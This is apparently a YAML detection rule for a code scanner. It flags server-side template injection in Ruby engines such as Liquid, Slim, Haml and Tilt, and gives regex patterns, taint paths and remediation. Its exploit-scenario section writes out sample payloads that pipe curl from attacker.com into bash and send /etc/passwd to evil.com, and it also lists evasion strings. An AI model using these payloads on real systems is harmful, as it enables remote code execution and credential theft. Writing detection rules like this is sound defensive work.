- rule_id: RUBY-INJ-008
  title: Server-Side Template Injection via Liquid/Slim/Haml
  description: 'Detects server-side template injection vulnerabilities where user-controlled input is rendered through Ruby
    templating engines such as Liquid, Slim, Haml, or Tilt without proper sandboxing. Attackers can inject template directives
    to execute arbitrary Ruby code, access application objects, read environment variables, or traverse the object graph to
    achieve remote code execution.

    '
  language: ruby
  category: injection
  severity: High
  confidence: 0.89
  cwe: CWE-94
  owasp: A03:2021-Injection
  tags:
  - ssti
  - template-injection
  - liquid
  - slim
  - haml
  - tilt
  - rce
  - code-injection
  detection_layer: 3
  attack_surface_type: Template rendering endpoint
  patterns:
  - type: regex
    pattern: Liquid::Template\.parse\s*\(\s*(?:params|request|input|user|data)\b
    description: Liquid template parsed from user-controlled input allowing tag injection
  - type: regex
    pattern: Slim::Template\.new\s*\(\s*(?:params|request|input|user|data)\b
    description: Slim template instantiated with user input enabling Ruby code execution via interpolation
  - type: regex
    pattern: Haml::Engine\.new\s*\(\s*(?:params|request|input|user|data)\b
    description: Haml engine rendering user-controlled template with embedded Ruby evaluation
  - type: regex
    pattern: Tilt\.new\s*\(\s*(?:params|request|input|user|data)\b
    description: Tilt generic template engine with user-controlled template source
  - type: regex
    pattern: render\s+inline\s*:\s*(?:params|request|input|user|data)\b
    description: Rails render inline with user input, directly evaluating template contents
  - type: regex
    pattern: Tilt\[.*\]\.new\s*\(\s*(?:params|request|input|user|data)\b
    description: Tilt engine lookup with user-controlled template type and content
  - type: regex
    pattern: Mustache\.render\s*\(\s*(?:params|request|input|user|data)\b
    description: Mustache rendering with user-controlled template string
  - type: regex
    pattern: render\s*\(\s*(?:text|html|body)\s*:\s*(?:params|request|input|user|data)\b
    description: Rails render with user-controlled content body that may include template directives
  anti_patterns:
  - Liquid::Template.parse(File.read
  - 'render template:'
  - 'render partial:'
  - 'render file:'
  - 'render action:'
  - Erubi
  - sanitize
  - escape_html
  - Liquid::Template.register_filter
  - Liquid::C.parse
  bypass_variants:
  - description: Injecting Liquid tags that access the forloop or tablerow objects to leak data
    pattern: Liquid::Template\.parse\s*\(.*(?:\{\%|\{\{).*(?:forloop|tablerow|assign|capture|include)\b
  - description: Chaining Slim/Haml string interpolation to break out of template context into Ruby execution
    pattern: (?:Slim|Haml)::(?:Template|Engine)\.new\s*\(.*#\{.*(?:system|exec|eval|File|IO|Kernel)\b
  - description: Using Tilt with user-controlled engine type to force evaluation through a dangerous engine
    pattern: Tilt\[\s*(?:params|request|input)\b.*\]\.new
  evasion_indicators:
  - '{{ self }}'
  - '{% raw %}'
  - '{{ ''''.__class__ }}'
  - '#{ system('
  - = `
  - '- eval('
  - '#{`id`}'
  encoding_variants:
  - type: html_entity_encoding
    pattern: (?:Liquid|Slim|Haml).*(?:&#x7b;|&#123;|&lcub;).*(?:params|request|input)\b
  - type: unicode_escape
    pattern: (?:Liquid|Slim|Haml).*(?:\\u007b|\\x7b).*(?:params|request|input)\b
  multi_function_chain_patterns:
  - params\[.*\].*Liquid::Template\.parse\s*\(.*\.render
  - request\.body\.read.*(?:Slim|Haml|Tilt).*\.render
  - 'params\[.*template.*\].*render\s+inline:'
  privilege_context_flags:
    requires_auth_context: false
    admin_only_risk: false
    escalation_vector: Remote code execution via template injection allowing access to Ruby runtime, environment variables,
      application secrets, and OS command execution
  business_logic_indicator:
    financial_impact: true
    data_exposure_risk: true
    compliance_relevant: true
  probable_taint_paths:
  - source: params[:template] or params[:content]
    sink: 'Liquid::Template.parse(user_template).render or render inline: user_template'
    through: CMS page editor, email template customization, or dynamic content rendering feature
  - source: Database column containing user-submitted template content
    sink: Slim::Template.new { user_stored_template }.render
    through: Admin customization panel where templates are stored in database and rendered server-side
  impact: 'Server-side template injection in Ruby applications allows attackers to inject

    template directives that are executed on the server. The severity depends on the

    templating engine: Liquid provides a sandboxed environment but custom tags and

    filters can leak data or enable denial of service; Slim and Haml allow embedded

    Ruby code execution by design, meaning any user-controlled template leads directly

    to RCE; Tilt dispatches to multiple engines and user-controlled engine selection

    can escalate from safe to dangerous template evaluation. Successful exploitation

    enables arbitrary code execution, access to application secrets and environment

    variables (including database credentials, API keys), full filesystem access,

    and lateral movement to connected services and databases.

    '
  remediation: "Framework-specific fixes:\n  - Rails: never use render inline: with user input; use pre-defined templates\n\
    \      render template: \"pages/show\"\n      render partial: \"shared/content\", locals: { content: sanitized_content\
    \ }\n  - Liquid: use strict mode and restrict available filters/tags\n      template = Liquid::Template.parse(content)\n\
    \      template.render({}, strict_variables: true, strict_filters: true)\n  - Slim/Haml: never parse user-controlled strings\
    \ as templates\n      # Instead of Slim::Template.new { params[:content] }.render\n      # Use pre-compiled templates\
    \ with safe variable interpolation\n  - Tilt: never allow user-controlled engine type selection\n      # Never: Tilt[params[:format]].new\
    \ { content }.render\n      # Always: use a fixed, known-safe engine\nSecure libraries:\n  - Liquid with strict mode (sandboxed,\
    \ limited to safe operations)\n  - Mustache (logic-less templating, no code execution)\n  - Rails ActionView with pre-compiled\
    \ templates (ERB/Erubi from files only)\n  - Markdown renderers (Redcarpet, Kramdown) for user-formatted content\nPrevention\
    \ strategies:\n  - Never allow user input to be used as template source in any engine\n  - Use Liquid in strict mode for\
    \ user-customizable templates with curated filters\n  - Pre-compile all templates from trusted filesystem sources only\n\
    \  - Implement Content Security Policy headers to limit template output behavior\n  - Separate user-customizable content\
    \ from template logic using a WYSIWYG editor or Markdown\n  - Audit all render calls in controllers for inline or dynamic\
    \ template usage\n  - Use Brakeman render checks and template injection detection in CI/CD\n  - If user-customizable email\
    \ templates are required, use Liquid with a strict allowlist of variables\n"
  references:
  - https://cwe.mitre.org/data/definitions/94.html
  - https://portswigger.net/research/server-side-template-injection
  - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
  context_awareness:
    surrounding_context_patterns:
    - class.*<.*ApplicationController
    - class.*<.*ActionController::Base
    - require.*liquid
    - require.*slim
    - require.*haml
    - require.*tilt
    - class.*Mailer
    - class.*CmsController
    - class.*TemplateService
    - def render_custom
    - def preview
    taint_source_indicators:
    - params[:template]
    - params[:content]
    - params[:body]
    - params[:layout]
    - params[:format]
    - request.body
    - request.raw_post
    - cookies[
    - session[
    - database_record.template_body
    taint_sink_indicators:
    - Liquid::Template.parse(
    - Slim::Template.new(
    - Haml::Engine.new(
    - Tilt.new(
    - Tilt[].new(
    - 'render inline:'
    - 'render text:'
    - 'render html:'
    - Mustache.render(
    - .render(
    sanitization_patterns:
    - 'strict_variables: true'
    - 'strict_filters: true'
    - Liquid::Template.register_tag
    - escape_html
    - sanitize(
    - 'render template:'
    - 'render partial:'
  severity_scoring:
    severity_weight: 9
    risk_score_formula_hint: severity_weight * confidence * (1 + engine_power_factor + sandbox_escape_factor)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A SaaS application allows users to customize notification email templates using a WYSIWYG editor that
      stores templates in the database. The application renders these templates server-side using Slim::Template.new { stored_template
      }.render. An attacker edits their template source (via API or by intercepting the form submission) to include = `cat
      /etc/passwd` or #{ system(''curl attacker.com/shell|bash'') }, which Slim evaluates as Ruby code during rendering. This
      grants the attacker remote code execution every time the notification is sent.

      '
    example_payload: = system('curl http://evil.com/exfil?data=' + File.read('/etc/passwd').gsub("\n",","))
    attacker_objective: Execute arbitrary Ruby code on the server to steal application secrets, read the filesystem, establish
      reverse shells, or compromise connected services and databases.
